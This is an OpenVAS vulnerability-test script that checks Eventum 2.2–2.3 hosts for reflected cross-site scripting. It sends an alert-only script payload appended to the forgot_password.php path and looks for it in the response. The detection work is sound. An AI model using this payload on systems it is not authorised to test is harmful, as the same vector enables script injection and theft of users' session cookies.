###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oracle_mysql_eventum_mult_xss_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Oracle MySQL Eventum Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801593");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-02-17 16:08:28 +0100 (Thu, 17 Feb 2011)");
  script_tag(name:"cvss_base", value:"4.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");
  script_name("Oracle MySQL Eventum Multiple Cross Site Scripting Vulnerabilities");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/98423/ZSL-2011-4989.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  script code in the browser of an unsuspecting user in the context of the
  affected site. This may let the attacker steal cookie-based authentication
  credentials and launch other attacks.");
  script_tag(name:"affected", value:"MySQL Eventum version 2.2 and 2.3");
  script_tag(name:"insight", value:"Multiple flaws are due to an error in '/htdocs/list.php',
  '/htdocs/forgot_password.php' and '/htdocs/select_project.php', which is not
  properly validating the input passed to the 'keywords' parameter.");
  script_tag(name:"solution", value:"Upgrade to MySQL Eventum version 2.3.1 or later.");
  script_tag(name:"summary", value:"This host is running Oracle MySQL Eventum and is prone to
  multiple cross site scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://forge.mysql.com/wiki/Eventum");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port)) {
  exit(0);
}

foreach dir (make_list_unique("/eventum", "/Eventum", "/", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  req = http_get(item:string(dir,"/htdocs/index.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  if(">Login - Eventum<" >< res)
  {

    req = http_get(item:string(dir,'/htdocs/forgot_password.php/"><script>' +
                  'alert("XSS-ATTACK_TEST")</script>'), port:port);

    res = http_keepalive_send_recv(port:port, data:req);

    ##  Confirm the exploit
    if(res =~ "HTTP/1\.. 200" && '<script>alert("XSS-ATTACK_TEST")</script>' >< res)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
